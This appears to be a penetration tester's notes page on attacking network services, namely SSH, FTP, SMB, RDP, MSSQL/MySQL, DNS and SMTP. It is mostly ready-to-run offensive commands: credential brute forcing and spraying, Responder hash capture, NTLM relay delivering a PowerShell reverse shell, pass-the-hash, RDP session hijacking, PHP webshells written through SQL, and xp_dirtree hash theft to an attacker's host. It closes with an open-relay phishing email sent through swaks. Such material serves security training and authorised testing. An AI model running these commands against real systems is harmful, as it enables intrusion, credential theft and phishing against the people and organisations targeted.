---
title: Notes | Services
author: Zeropio
date: 2022-07-15
categories: [Notes, System]
tags: [ssh, ftp, smb, rdp]
permalink: /notes/system/services
---

Vulnerabilities are commonly discovered by people who use and understand technology, a protocol, or a service. As we evolve in this field, we will find different services to interact with, and we will need to evolve and learn new technology constantly. 

Misconfigurations usually happen when a system administrator, technical support, or developer does not correctly configure the security framework of an application, website, desktop, or server leading to dangerous open pathways for unauthorized users. Once we grab the service banner, the next step should be to identify possible default credentials. If there are no default credentials, we can try the weak username and password combinations:
```
admin:admin
admin:password
admin:<blank>
root:12345678
administrator:Password
```

Another misconfiguration that can exist in common services is anonymous authentication. Misconfigured access rights are when user accounts have incorrect permissions. Unnecessary defaults are those settings we need to change to secure a system by reducing its attack surface.

When attacking a service, we usually play a detective role, and we need to collect as much information as possible and carefully observe the details. Sensitive information may include, but is not limited to:
- Usernames
- Email Addresses
- Passwords
- DNS records
- IP Addresses
- Source code
- Configuration files
- PII

There are two key elements to finding sensitive information:
1. We need to understand the service and how it works.
2. We need to know what we are looking for.

---

# SSH

## Basic Access
We can try login using the **anonymous** user by default (with no password):
```console
$ ssh anonymous@ip
    Enter password:
anonymous@ip#  
```

## RSA file
If we manage to get the rsa file we can connect with:
```console
$ chmod 600 id_rsa
$ ssh -i id_rsa user@ip
```

---

# FTP 

The File Transfer Protocol (FTP) is a standard network protocol used to transfer files between computers. By default, FTP listens on port **TCP/21**. To attack an FTP Server, we can abuse misconfiguration or excessive privileges, exploit known vulnerabilities or discover new vulnerabilities. To perform a basic connection to a FTP:
```console
zero@pio$ ftp <ip>
```

We can download all the aviables file in a system with:
```console
zero@pio$ wget -m --no-passive ftp://<USER>:<PASSWORD>@<IP>
```

Inside, basic commands can be use:

| **Command**   | **Description**    |
|--------------- | --------------- |
| `ls`   | List files and folders   |
| `cd <path>`   | Change directory   |
| `get <FILE>`   | Download file in our machine   |
| `put <FILE>` | Uplaod file from our machine |
| `exit`   | Exit the FTP   |

A full command list [here](https://www.smartfile.com/blog/the-ultimate-ftp-commands-list/), with a list of the status [here](https://en.wikipedia.org/wiki/List_of_FTP_server_return_codes).


We can enumerate it with Nmap:
```console
zero@pio$ sudo nmap -sCV -p 21 <TARGET>
```

We can abuse the misconfiguration to try to loggin as the **Anonymous** user:
```console
zero@pio$ ftp <TARGET> 

Name (<TARGET>:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

We can use [Medusa](https://github.com/jmk-foofus/medusa) to brute forcing:
```console
zero@pio$ medusa -u <USER> -P <WORDLIST> -h <TARGET> -n <PORT> -M ftp 
```

## FTP Bounce Attack 

An FTP bounce attack is a network attack that uses FTP servers to deliver outbound traffic to another device on the network. The attacker uses a PORT command to trick the FTP connection into running commands and getting information from a device other than the intended server. Consider we are targetting an FTP Server **FTP_DMZ** exposed to the internet. Another device within the same network, **Internal_DMZ**, is not exposed to the internet. We can use the connection to the **FTP_DMZ** server to scan **Internal_DMZ** using the FTP Bounce attack and obtain information about the server's open ports.

The Nmap `-b` flag can be used to perform an FTP bounce attack:
```console
zero@pio$ nmap -Pn -v -n -p80 -b <USER>:<PASSWORD>@<TARGET> <BOUNCE TARGET>
```

---

# Smb

**SMB** (Server Message Block) is a communication protocol created for providing shared access to files and printers across nodes on a network. It was designed to run on top of NetBIOS over TCP/IP (NBT) using **TCP port 139** and **UDP ports 137** and **138**.  However, with Windows 2000, Microsoft added the option to run SMB directly over **TCP/IP on port 445** without the extra NetBIOS layer. Samba is a Unix/Linux-based open-source implementation of the SMB protocol. It also allows Linux/Unix servers and Windows clients to use the same SMB services. Another protocol that is commonly related to SMB is **MSRPC** (**Microsoft Remote Procedure Call**). 

The vulnerability **EternalBlue** is one of the most famous from Smb.

To check the Samba with Nmap:

```console
zero@pio$ nmap --script smb-os-discovery.nse -p <PORT> <TARGET>
zero@pio$ sudo nmap -sVC -p 139,445 <TARGET>
```

## Connection

Samba share folders and files. We can try connecting to it with **smbclient**. First, we need to list all the aviable folders:
```console
zero@pio$ smbclient -N -L \\\\<TARGET>

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        users           Disk      
        IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

| **Flag**   | **Description**    |
|--------------- | --------------- |
| `-N`   | No password   |
| `-L`   | List |

Then we can perform a connection:
```console
zero@pio$ smbclient \\\\<TARGET>\\<FOLDER>
 smb: \>
```

To connect as a user:
```console
zero@pio$ smbclient -U <user> \\\\<ip>\\<folder>
```

**Smbmap** is another tool that helps us enumerate network shares and access associated permissions. An advantage of smbmap is that it provides a list of permissions for each shared folder:
```console
zero@pio$ smbmap -H <TARGET>
```

We can even browser between directories with `-r`:
```console
zero@pio$ smbmap -H <TARGET> -r <FOLDER>
```

Or download and upload:
```console
zero@pio$ smbmap -H <TARGET> --download "<FOLDER>\<FILE>"
zero@pio$ smbmap -H <TARGET> --upload <PATH TO FILE> "<FOLDER>\<OUTPUT FILE>"
```

## Commands in SMB

| **Command**   | **Description**    |
|--------------- | --------------- |
| `ls`   | List files and folders   |
| `cd`   | Change directory   |
| `get <file>`   | Download file in our machine   |
| `exit`   | Exit   |

## RPC 

We can use the rpcclient tool with a null session to enumerate a workstation or Domain Controller.
```console
zero@pio$ rpcclient -U'%' <TARGET>

rpcclient $>
```

## Explotation 

We can use **CrackMapExec** to brute force it:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER LIST> -p <PASSWORD> -d <DOMAIN>
```

If this user is an Administrator or has specific privileges, we will be able to perform operations such as:
- Remote Command Execution
- Extract Hashes from SAM Database
- Enumerating Logged-on Users
- Pass-the-Hash (PTH)

To perform a RCE we can download [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec) from Microsoft website, or we can use some Linux implementations:
- Impacket [PsExec](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/psexec.py)
- Impacket [SMBExec](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/smbexec.py)
- Impacket [atexec](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/atexec.py)
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- Metasploit [PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md)

For example:
```console
zero@pio$ impacket-psexec <USER>:'<PASSWORD>'@<TARGET>
```

The same options apply to **impacket-smbexec** and **impacket-atexec**. With CrackMapExec:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' -x 'whoami' --exec-method smbexec
```

> If the `--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.
{: .prompt-tip}

We can also use it to enumerate loggin users:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' --loggedon-users
```

Extract hashes from SAM database:
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -p '<PASSWORD>' --sam
```

Pass-the-Hash (PtH):
```console
zero@pio$ crackmapexec smb <TARGET> -u <USER> -H <HASH>
```

We can also abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes. The most common tool to perform such operations is the [Responder](https://github.com/lgandx/Responder). Imagine we created a fake SMB server using the Responder default configuration, with the following command:
```console
zero@pio$ responder -I <INTERFACE>
```

On Windows machines, the procedure will roughly be as follows:
1. The hostname file share's IP address is required.
2. The local host file (`C:\Windows\System32\Drivers\etc\hosts`{: .filepath}) will be checked for suitable records.
3. If no records are found, the machine switches to the local DNS cache, which keeps track of recently resolved names.
4. Is there no local DNS record? A query will be sent to the DNS server that has been configured.
5. If all else fails, the machine will issue a multicast query, requesting the IP address of the file share from other machines on the network.

Suppose a user mistyped a shared folder's name `\\mysharefoder\` instead of `\\mysharedfolder\`. In that case, all name resolutions will fail because the name does not exist, and the machine will send a multicast query to all devices on the network, including us running our fake SMB server. 
```console
zero@pio$ responder -I <INTERFACE>

...
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Domain Master Browser)
[*] [NBT-NS] Poisoned answer sent to 10.10.110.17 for name WORKGROUP (service: Browser Election)
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[*] [LLMNR]  Poisoned answer sent to 10.10.110.17 for name mysharefoder
[*] [MDNS] Poisoned answer sent to 10.10.110.17   for name mysharefoder.local
[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : WIN7BOX\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:997b18cc61099ba2:3CC46296B0CCFC7A231D918AE1DAE521:0101000000000000B09B51939BA6D40140C54ED46AD58E890000000002000E004E004F004D00410054004300480001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D0042003100320008003000300000000000000000000000003000004289286EDA193B087E214F3E16E2BE88FEC5D9FF73197456C9A6861FF5B5D3330000000000000000
```

These captured credentials can be cracked using hashcat or relayed to a remote host to complete the authentication and impersonate the user.
```console
zero@pio$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

 If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://raw.githubusercontent.com/lgandx/Responder/master/tools/MultiRelay.py). Let us see an example using **impacket-ntlmrelayx**.

First, we need to set SMB to **OFF** in our responder configuration file (`/etc/responder/Responder.conf`{: .filepath}):
```console
zero@pio$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute **impacket-ntlmrelayx**. By default, impacket-ntlmrelayx will dump the SAM database, but we can execute commands by adding the option `-c`:
```console
zero@pio$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET>
```

We can create a PowerShell reverse shell using [revshells](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64):
```console
zero@pio$ impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET> -c 'powershell -e <PAYLOAD>'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
```console
zero@pio$ nc -lvnp 9000
```

---

# RDP 
RDP is a proprietary Microsoft protocol which allows a user to connect to a remote system over a network connection and obtain a graphical user interface. RDP uses **port TCP/3389**.
```console
zero@pio$ nmap -Pn -p 3389 <TARGET> 
```

## Connection 

To perform a connection to a RDP:
```console
zero@pio$ xfreerdp /v:<TARGET> /u:<USER> /p:<PASSWORD>
```

```console
zero@pio$ rdesktop -u <USER> -p <PASSWORD> <TARGET>
```

## Explotation 

We can use the [Crowbar](https://github.com/galkan/crowbar) tool to brute force it:
```console
zero@pio$ crowbar -b rdp -s <TARGET> -U <USER LIST> -c '<PASSWORD>'
```

We can also use Hydra to perform an RDP password spray attack:
```console
zero@pio$ hydra -L <USER LIST> -p '<PASSWORD>' <TARGET> rdp
```

### RDP Session Hijacking 

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. For example, the following command will open a new console as the specified **SESSION_ID** within our current RDP session:
```console
C:\zeropio> tscon #<TARGET_SESSION_ID> /dest:#<OUR_SESSION_NAME>
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or [Mimikatz](https://github.com/gentilkiwi/mimikatz). We will use **Microsoft sc.exe** binary. First, we specify the service name (**sessionhijack**) and the **binpath**, which is the command we want to execute. Once we run the following command, a service named sessionhijack will be created.
```console
C:\zeropio> query user 

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
 lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM

C:\zeropio> sc.exe create sessionhijack binpath= "cmd.exe /k tscon <ID> /dest:rdp-tcp#<NUMBER>"
```

To run the command, we can start the **sessionhijack** service:
```console
C:\zeropio> net start sessionhijack
```

### RDP Pass-the-Hash (PtH)

In some instances, we can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp. **Restricted Admin Mode**, which is disabled by default, should be enabled on the target host. This can be enabled by adding a new registry key `DisableRestrictedAdmin` (**REG_DWORD**) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`{: .filepath}. It can be done using the following command:
```console
C:\zeropio> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once the registry key is added, we can use xfreerdp with the option `/pth` to gain RDP access:
```console
xfreerdp /v:<TARGET> /u:<USER> /pth:<HASH>
```

---

# SQL Databases 

**MySQL** and **Microsoft SQL Server** (**MSSQL**) are relational database management systems that store data in tables, columns, and rows. By default, MSSQL uses port **TCP/1433**, and MySQL uses **TCP/3306**.
```console
zero@pio$ nmap -Pn -sVC -p 1433,3306 <TARGET>
```

MSSQL supports two authentication modes, which means that users can be created in Windows or the SQL Server:

| **Authentication Type**   | **Description**    |
|--------------- | --------------- |
| Windows authentication mode | This is the default, often referred to as integrated security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. |
| Mixed mode | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server. |

MySQL also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). 

MySQL default system schemas/databases:

| **Schema/Database**   | **Description**    |
|--------------- | --------------- |
| `mysql` | is the system database that contains tables that store information required by the MySQL server |
| `information_schema` | provides access to database metadata |
| `performance_schema` | is a feature for monitoring MySQL Server execution at a low level
| `sys` | a set of objects that helps DBAs and developers interpret data collected by the Performance Schema |

MSSQL default system schemas/databases:

| **Schema/Database**   | **Description**    |
|--------------- | --------------- |
| `master` | keeps the information for an instance of SQL Server |
| `msdb` | used by SQL Server Agent |
| `model` | a template database copied for each new database |
| `resource` | a read-only database that keeps system objects visible in every database on the server in sys schema |
| `tempdb` | keeps temporary objects for SQL queries |


## Connection 

To perform a connection in Linux:
```console
zero@pio$ mysql -u <USER> -p<PASSWORD> -h <TARGET>
```

In Windows:
```console
C:\zeropio> sqlcmd -S SRVMSSQL -U <USER> -P '<PASSWORD>' -y 30 -Y 30
```

> When we authenticate to MSSQL using sqlcmd we can use the parameters `-y` and `-Y` for better looking output. Keep in mind it may affect performance.
{: .prompt-alert}

If we are targetting MSSQL from Linux, we can use sqsh as an alternative to sqlcmd:
```console
zero@pio$ sqsh -S <TARGET> -U <USER> -P '<PASSWORD>' -h
```

> When we authenticate to MSSQL using sqsh we can use the parameters `-h` to disable headers and footers for a cleaner look.
{: .prompt-tip}

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`:
```console
zero@pio$ sqsh -S <TARGET> -U .\\<USER> -P '<PASSWORD>' -h
```

## Syntax 

### Show Databases

```console
mysql> SHOW DATABASES;
```

If we use sqlcmd, we will need to use `GO` after our query to execute the SQL syntax:
```console
1> SELECT name FROM master.dbo.sysdatabases
2> GO
```

### Select a Database 

```console
mysql> USE database;
```

```console
1> USE database
2> GO
```

### Show Tables 

```console
mysql> SHOW TABLES;
```

```console
1> SELECT table_name FROM database.INFORMATION_SCHEMA.TABLES
2> GO
```

### Select all Data from Table "users"

```console
mysql> SELECT * FROM users;
```

```console
1> SELECT * FROM users
2> go
```

## Explotation 

### XP\_CMDSHELL

MSSQL has a extended stored procedures called `xp_cmdshell` which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
-  is a powerful feature and disabled by default, can be enabled and disabled by using the Policy-Based Management or by executing `sp_configure`
- operates synchronously, control is not returned to the caller until the command-shell command is completed

To execute commands using SQL syntax on MSSQL, use:
```console
1> xp_cmdshell 'whoami'
2> GO
```

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:
```
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

### Write Local Files 

MySQL does not have a stored procedure like `xp_cmdshell`, but we can archive command execution if we write to a location in the file system that can execute our commands, using `SELECT INTO OUTFILE` in the webserver directory:
```console
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
```

In MySQL, a global system variable `secure_file_priv` limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT â€¦ INTO OUTFILE` statements and the `LOAD_FILE()` function. These operations are permitted only to users who have the **FILE** privilege. `secure_file_priv` may be set as follows:
- If **empty**, the variable has no effect, which is not a secure setting.
- If set to the **name of a directory**, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to **NULL**, the server disables import and export operations.

```console
mysql> show variables like "secure_file_priv";
```

To write files using MSSQL, we need to enable **Ole Automation Procedures**, which requires admin privileges, and then execute some stored procedures to create the file. To enable it:
```console
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Then to create a file:
```console
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files 

By default, MSSQL allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:
```console
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO
```

As we previously mentioned, by default a MySQL installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:
```console
mysql> select LOAD_FILE("/etc/passwd");
```

### Capture MSSQL Service Hash 

To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:

- **XP_DIRTREE** Hash Stealing

```console
1> EXEC master..xp_dirtree '\\<OUR IP>\share\'
2> GO
```

- **XP_SUBDIRS** Hash Stealing

```console
1> EXEC master..xp_subdirs '\\<OUR IP>\share\'
2> GO
```

With the Responder or Impacket:
```console
zero@pio$ sudo responder -I tun0 

...

zero@pio$  sudo impacket-smbserver share ./ -smb2support

...
```

After getting the password, crack it with **hashcat mode 5600**.

### Impersonate Existing Users with MSSQL 

SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. First, we need to identify users that we can impersonate. Sysadmins can impersonate anyone by default, But for non-administrator users, privileges must be explicitly assigned. We can use the following query to identify users we can impersonate:
```console
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO
```

To get an idea of privilege escalation possibilities, let's verify if our current user has the sysadmin role:
```console
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
```

If we get a value `0` we do not have the sysadmin role, but we can impersonate the **sa** user. To impersonate a user, we can use the Transact-SQL statement **EXECUTE AS LOGIN** and set it to the user we want to impersonate:
```console
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO
```

If we get a value `1` we have impersonated the user **sa** successfully.

### Communicate with Other Databases with MSSQL 

MSSQL has a configuration option called **linked servers**. Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle. Identify linked Servers in MSSQL:
```console
1> SELECT srvname, isremote FROM sysservers
2> GO
```

In the **isrmeote** column, a `1` means is a remote server, and `0` is a linked server. Next, we can attempt to identify the user used for the connection and its privileges. The EXECUTE statement can be used to send pass-through commands to linked servers. We add our command between parenthesis and specify the linked server between square brackets `[ ]`:
```console
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<TARGET>]
2> GO
```

---

# DNS 

The **Domain Name System** (**DNS**) translates domain names to the numerical IP addresses. DNS is mostly **UDP/53**, but DNS will rely on **TCP/53** more heavily as time progresses. 
```console
zero@pio$ nmap -p 53 -Pn -sVC <TARGET>
```

## AXFR Zone Transfer 

A DNS zone is a portion of the DNS namespace that a specific organization or administrator manages. Since DNS comprises multiple DNS zones, DNS servers utilize DNS zone transfers to copy a portion of their database to another DNS server. An attacker could leverage this DNS zone transfer vulnerability to learn more about the target organization's DNS namespace, increasing the attack surface. For exploitation, we can use the dig utility with DNS query type AXFR option to dump the entire DNS namespaces from a vulnerable DNS server:
```console
zero@pio$ dig AXFR <DOMAIN> @<TARGET>
```

[Fierce](https://github.com/mschwager/fierce) could help us enumerating all DNS servers.
```console
zero@pio$ fierce --domain <DOMAIN>
```

## Domain Takeovers 

**Domain takeover** is registering a non-existent domain name to gain control over another domain. If attackers find an expired domain, they can claim that domain to perform further attacks such as hosting malicious content on a website or sending a phishing email leveraging the claimed domain. Domain takeover is also possible with subdomains called **subdomain takeover**. A DNS's canonical name (**CNAME**) record is used to map different domains to a parent domain. Usually enterprises create a subdomain and make it point to other services.  For example, if **subdomain.example.com** was pointing to a GitHub page and the user decided to delete their GitHub page, an attacker can now create a GitHub page, add a CNAME file containing **subdomain.example.com**, and claim **subdomain.example.com**. Another example:
```
sub.target.com.   60   IN   CNAME   anotherdomain.com
```

The domain name (`sub.target.com`) uses a CNAME record to another domain (`anotherdomain.com`). Suppose the **anotherdomain.com** expires and is available for anyone to claim the domain since the **target.com**'s DNS server has the CNAME record. In that case, anyone who registers **anotherdomain.com** will have complete control over **sub.target.com** until the DNS record is updated.

## Subdomain Enumeration

Before performing a subdomain takeover, we should enumerate subdomains for a target domain using tools like [Subfinder](https://github.com/projectdiscovery/subfinder) (more below):
```console
zero@pio$ ./subfinder -d <TARGET> -v
```

Other tool is [SubBrute](https://github.com/TheRook/subbrute), to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access:
```console
zero@pio$ ./subbrute <DOMAIN> -s ./names.txt -r ./resolvers.txt
```

> **Gobuster** doesn't work here, because DNS zone doesn't return an IP.
{: .prompt-alert}

Using the `nslookup` or `host` command, we can enumerate the CNAME records for those subdomains.
```console
zero@pio$ host <SUBDOMAIN>
```

If we see the subdomain is pointing to another domain, but that domain doesn't exit (yet), we can perform a subdomain takeover. We can help us with [Can I take over XYZ?](https://github.com/EdOverflow/can-i-take-over-xyz).

## DNS Spoofing 

**DNS spoofing** is also referred to as **DNS Cache Poisoning**. Example attack paths for the DNS Cache Poisoning are as follows:
- An attacker could intercept the communication between a user and a DNS server to route the user to a fraudulent destination instead of a legitimate one by performing a Man-in-the-Middle (MITM) attack.
- Exploiting a vulnerability found in a DNS server could yield control over the server by an attacker to modify the DNS records.

### Local 

From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like [Ettercap](https://www.ettercap-project.org/) or [Bettercap](https://www.bettercap.org/). To exploit the DNS cache poisoning via Ettercap, we should first edit the `/etc/ettercap/etter.dns`{: .filepath} file to map the target domain name that they want to spoof and the attacker's IP address that they want to redirect a user to:
```console
zero@pio$ cat /etc/ettercap/etter.dns

<DOMAIN>     A   <TARGET>
*.<DOMAIN>   A   <TARGET>
```

Next, start the **Ettercap** tool and scan for live hosts within the network by navigating to `Hosts > Scan for Hosts`. Once completed, add the target IP address to Target1 and add a default gateway IP to Target2. Activate `dns_spoof` attack by navigating to `Plugins > Manage Plugins`. This sends the target machine with fake DNS responses that will resolve <DOMAIN> to IP address <TARGET>.

After a successful DNS spoof attack, if a victim user coming from the target machine visits the <DOMAIN> domain on a web browser, they will be redirected to a Fake page that is hosted on IP address <TARGET>. In addition, a ping coming from the target IP  should be resolved too.

---

# SMTP 

A mail server is a server that handles and delivers email over a network. When we press the Send button in our email application (email client), the program establishes a connection to an SMTP server on the network or Internet. The name **SMTP** stands for **Simple Mail Transfer Protocol**, and it is a protocol for delivering emails from clients to servers and from servers to other servers. 

When we download emails to our email application, it will connect to a **POP3** or **IMAP4** server on the Internet, which allows the user to save messages in a server mailbox and download them periodically. By default, POP3 clients remove downloaded messages from the email server. On the other hand, by default, IMAP4 clients do not remove downloaded messages from the email server. 

We can use the **Mail eXchanger** (**MX**) DNS record to identify a mail server. We can use tools such as host or dig and online websites such as MXToolbox to query information about the MX records:
```console
zero@pio$  host -t MX <TARGET>
zero@pio$ host -t A <TARGET>
```

```console
zero@pio$ dig mx <TARGET> | grep "MX" | grep -v ";"
```

We can enumerate the following ports:

| **Port**   | **Service**    |
|--------------- | --------------- |
| `TCP/25` | SMTP Unencrypted |
| `TCP/143` | IMAP4 Unencrypted |
| `TCP/110` | POP3 Unencrypted |
| `TCP/465` |	SMTP Encrypted |
| `TCP/993` | IMAP4 Encrypted |
| `TCP/995` | POP3 Encrypted |

```console
zero@pio$ sudo nmap -Pn -sVC -p25,143,110,465,993,995 <TARGET>
```

## Authentication 

`VRFY` this command instructs the receiving SMTP server to check the validity of a particular email username. The server will respond, indicating if the user exists or not. This feature can be disabled.
```console
zero@pio$ telnet <TARGET> 25

...
VRFY root

252 2.0.0 root
```

`EXPN` is similar to VRFY, except that when used with a distribution list, it will list all users on that list. This can be a bigger problem than the VRFY command since sites often have an alias such as *all*.
```console
zero@pio$ telnet <TARGET> 25

...
EXPN john

250 2.1.0 john@target.pwn 

EXPN support-team

250 2.0.0 carol@target.pwn
250 2.1.5 elisa@target.pwn
```

`RCPT TO` identifies the recipient of the email message. This command can be repeated multiple times for a given message to deliver a single message to multiple recipients.
```console
zero@pio$ telnet <TARGET> 25

MAIL FROM:test@target.pwn
it is
250 2.1.0 test@htb.com... Sender ok


RCPT TO:julio

550 5.1.1 julio... User unknown

RCPT TO:john

250 2.1.5 john... Recipient ok
```

We can also use the POP3 protocol to enumerate users depending on the service implementation. For example, we can use the command `USER` followed by the username, and if the server responds `OK`. This means that the user exits on the server.
```console
zero@pio$ telnet <TARGET> 110 

USER julio

-ERR


USER john

+OK
```

We can use the [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum) tool to help us:
```console
zero@pio$ smtp-user-enum -M RCPT -U <USERLIST> -D <DOMAIN> -t <TARGET>
```

> More info [here](https://zeropio.github.io/notes/system/enumeration#smtp).
{: .prompt-tip}

The tool [o365spray](https://github.com/0xZDH/o365spray) is a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). 
```console
zero@pio$ python3 o365spray.py --validate --domain <TARGET>

...
[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: <TARGET>
```

Now, we can attempt to identify usernames:
```console
zero@pio$ python3 o365spray.py --enum -U <USER LIST> --domain <TARGET>   
```

We can use Hydra to perform a password spray or brute force against email services such as SMTP, POP3, or IMAP4. First, we need to get a username list and a password list and specify which service we want to attack. Let us see an example for POP3:
```console
zero@pio$ hydra -L <USER LIST> -p '<PASSWORD>' -f <TARGET> pop3
```

These tools are usually blocked. We can use o365spray, [MailSniper](https://github.com/dafthack/MailSniper) for Microsoft Office 365 or [CredKing](https://github.com/ustayready/CredKing) for Gmail or Okta.
```console
zero@pio$ python3 o365spray.py --spray -U <USER LIST> -p '<PASSWORD>' --count 1 --lockout 1 --domain <DOMAIN>
```

## Protocol Specifics Attacks 

### Open Relay 

With the **nmap smtp-open-relay** script, we can identify if an SMTP port allows an open relay:
```console
zero@pio$ nmap -p25 -Pn --script smtp-open-relay <TARGET>
```

Next, we can use any mail client to connect to the mail server and send our email:
```console
zero@pio$ swaks --from notifications@target.pwn --to employees@target.pwn --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server <TARGET>
```

---

# Resources 

| **Link**   | **Description**    |
|--------------- | --------------- |
| **General** |
| [Medusa](https://github.com/jmk-foofus/medusa) | Medusa is a speedy, parallel, and modular, login brute-forcer |
| [Responder](https://github.com/lgandx/Responder) | is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication |
| [Impacket](https://github.com/SecureAuthCorp/impacket) | is a collection of Python classes for working with network protocols |
| [mimikatz](https://github.com/gentilkiwi/mimikatz) | A little tool to play with Windows security |
| [Ettercap](https://www.ettercap-project.org/) | is a comprehensive suite for man in the middle attacks |
| [Bettercap](https://www.bettercap.org/) | Swiss Army knife for WiFi, Bluetooth Low Energy, wireless HID hijacking and IPv4 and IPv6 networks reconnaissance and MITM attacks || **SMB** |
| [SMBClient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) | lient that can 'talk' to an SMB/CIFS server |
| [SMBMap](https://github.com/ShawnDEvans/smbmap) | SMBMap is a handy SMB enumeration tool |
| [rpcclient](https://linux.die.net/man/1/rpcclient) | tool for executing client side MS-RPC functions |
| [enum4linux](https://github.com/cddmp/enum4linux-ng) | is a tool for enumerating information from Windows and Samba systems |
| **RDP** |
| [Crowbar](https://github.com/galkan/crowbar) | is brute forcing tool |
| **DNS** |
| [Fierce](https://github.com/mschwager/fierce) | A DNS reconnaissance tool for locating non-contiguous IP space |
